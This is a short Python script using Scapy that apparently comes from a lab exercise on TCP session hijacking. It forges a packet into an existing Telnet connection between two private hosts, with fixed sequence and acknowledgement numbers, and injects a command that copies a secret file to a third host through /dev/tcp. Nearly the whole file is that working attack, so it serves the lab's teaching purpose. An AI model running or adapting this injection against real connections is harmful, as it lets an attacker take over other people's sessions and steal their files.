#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.5", dst="10.0.2.6")
tcp = TCP(sport=48982,dport=23,flags="A",seq=3280140125, ack=1583542222, window=2000)
data = '\ncat /home/seed/secret.txt > /dev/tcp/10.0.2.7/9090\n'
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)